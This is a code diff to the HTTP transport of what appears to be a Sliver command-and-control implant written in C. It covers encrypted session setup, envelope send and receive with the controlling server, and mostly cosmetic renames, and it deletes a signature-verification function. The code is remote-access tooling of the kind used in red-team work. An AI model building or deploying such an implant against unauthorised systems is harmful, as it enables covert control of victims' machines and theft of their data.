@@ -800,7 +800,7 @@ PENVELOPE HttpRecv
 	}
 
 	pDecodedData = Base64Decode(pResp->pRespData);
-	pPlainText = SliverDecrypt(pConfig, pDecodedData);
+	pPlainText = SliverDecrypt(pConfig, pDecodedData, TRUE);
 	pResult = UnmarshalEnvelope(pPlainText);
 CLEANUP:
 	FREE(lpUri);
@@ -819,7 +819,7 @@ BOOL HttpSend
 	_In_ PENVELOPE pEnvelope
 )
 {
-	PBUFFER pMarshalledEnvelope = NULL;
+	PBUFFER pMarshaledEnvelope = NULL;
 	PBUFFER pCipherText = NULL;
 	LPSTR lpEncodedData = NULL;
 	LPSTR lpUri = NULL;
@@ -833,8 +833,8 @@ BOOL HttpSend
 
 	if (pEnvelope->pData != NULL) {
 		PrintFormatA("Write Envelope:\n");
-		if (pEnvelope->pData->cbBuffer > 0x2000) {
-			HexDump(pEnvelope->pData->pBuffer, 0x2000);
+		if (pEnvelope->pData->cbBuffer > 0x1000) {
+			HexDump(pEnvelope->pData->pBuffer, 0x1000);
 		}
 		else {
 			HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
@@ -844,8 +844,8 @@ BOOL HttpSend
 		PrintFormatW(L"Write Envelope: []\n");
 	}
 
-	pMarshalledEnvelope = MarshalEnvelope(pEnvelope);
-	pCipherText = SliverEncrypt(pConfig, pMarshalledEnvelope);
+	pMarshaledEnvelope = MarshalEnvelope(pEnvelope);
+	pCipherText = SliverEncrypt(pConfig, pMarshaledEnvelope, TRUE);
 	lpUri = CreateSessionURL(pConfig, pHttpClient);
 	if (lpUri == NULL) {
 		goto CLEANUP;
@@ -868,7 +868,7 @@ CLEANUP:
 	FREE(lpEncodedData);
 	FreeUri(pUri);
 	FreeBuffer(pCipherText);
-	FreeBuffer(pMarshalledEnvelope);
+	FreeBuffer(pMarshaledEnvelope);
 	FreeHttpResp(pResp);
 
 	return Result;
@@ -974,7 +974,7 @@ BOOL HttpStart
 	PBYTE pEncryptedSessionInit = NULL;
 	LPSTR lpRespData = NULL;
 	DWORD cbEncryptedSessionInit = 0;
-	PPBElement pMarshalledData = NULL;
+	PPBElement pMarshaledData = NULL;
 	DWORD dwSetCookieLength = 0;
 	WCHAR wszSetCookie[0x100];
 	LPWSTR lpTemp = NULL;
@@ -995,8 +995,8 @@ BOOL HttpStart
 		goto CLEANUP;
 	}
 
-	pMarshalledData = CreateBytesElement(pConfig->pSessionKey, CHACHA20_KEY_SIZE, 1);
-	pEncryptedSessionInit = AgeKeyExToServer(pConfig->lpRecipientPubKey, pConfig->lpPeerPrivKey, pConfig->lpPeerPubKey, pMarshalledData->pMarshalledData, pMarshalledData->cbMarshalledData, &cbEncryptedSessionInit);
+	pMarshaledData = CreateBytesElement(pConfig->pSessionKey, CHACHA20_KEY_SIZE, 1);
+	pEncryptedSessionInit = AgeKeyExToServer(pConfig->lpRecipientPubKey, pConfig->lpPeerPrivKey, pConfig->lpPeerPubKey, pMarshaledData->pMarshaledData, pMarshaledData->cbMarshaledData, &cbEncryptedSessionInit);
 	if (pEncryptedSessionInit == NULL || cbEncryptedSessionInit == 0) {
 		goto CLEANUP;
 	}
@@ -1009,7 +1009,7 @@ BOOL HttpStart
 
 	lpRespData = ExtractSubStrA(pResp->pRespData, pResp->cbResp);
 	pDecodedResp = Base64Decode(lpRespData);
-	pSessionId = SliverDecrypt(pConfig, pDecodedResp);
+	pSessionId = SliverDecrypt(pConfig, pDecodedResp, TRUE);
 	memcpy(pConfig->szSessionID, pSessionId->pBuffer, pSessionId->cbBuffer);
 	pConfig->szSessionID[sizeof(pConfig->szSessionID) - 1] = '\0';
 	dwSetCookieLength = sizeof(wszSetCookie);
@@ -1033,7 +1033,7 @@ CLEANUP:
 	FREE(pEncryptedSessionInit);
 	FreeBuffer(pDecodedResp);
 	FreeBuffer(pSessionId);
-	FreeElement(pMarshalledData);
+	FreeElement(pMarshaledData);
 	FreeHttpResp(pResp);
 
 	return Result;
@@ -1359,49 +1359,4 @@ CLEANUP:
 	}
 
 	return pResult;
-}
-
-BOOL VerifySign
-(
-	_In_ PMINISIGN_PUB_KEY pPubKey,
-	_In_ PBYTE pMessage,
-	_In_ DWORD cbMessage,
-	_In_ BOOL IsHashed
-)
-{
-	UINT16 Algorithm;
-	BYTE KeyID[8];
-	BYTE Signature[ED25519_SIGNATURE_SIZE];
-	BOOL Result = FALSE;
-	PBYTE HashBuffer = NULL;
-	PBYTE pBuffer = NULL;
-	DWORD cbBuffer = 0;
-
-	memcpy(&Algorithm, pMessage, sizeof(Algorithm));
-	memcpy(KeyID, pMessage + sizeof(Algorithm), sizeof(KeyID));
-	memcpy(Signature, pMessage + sizeof(Algorithm) + sizeof(KeyID), sizeof(Signature));
-	PrintFormatA("KeyID:\n");
-	HexDump(KeyID, sizeof(KeyID));
-
-	PrintFormatA("pPubKey->KeyId:\n");
-	HexDump(pPubKey->KeyId, sizeof(KeyID));
-
-	if (memcmp(KeyID, pPubKey->KeyId, sizeof(KeyID))) {
-		LogError(L"%s.%d: KeyID != pPubKey->KeyId\n", __FILEW__, __LINE__);
-		goto CLEANUP;
-	}
-
-	pBuffer = pMessage + sizeof(Algorithm) + sizeof(KeyID) + sizeof(Signature);
-	cbBuffer = cbMessage - sizeof(Algorithm) - sizeof(KeyID) - sizeof(Signature);
-	if (pPubKey->SignatureAlgorithm == HASH_EDDSA && !IsHashed) {
-		HashBuffer = Blake2B(pMessage, cbMessage, NULL, 0);
-		pBuffer = HashBuffer;
-		cbBuffer = BLAKE2B_OUTBYTES;
-	}
-
-	Result = ED25519Verify(Signature, pBuffer, cbBuffer, pPubKey->PublicKey);
-CLEANUP:
-	FREE(HashBuffer);
-
-	return Result;
 }
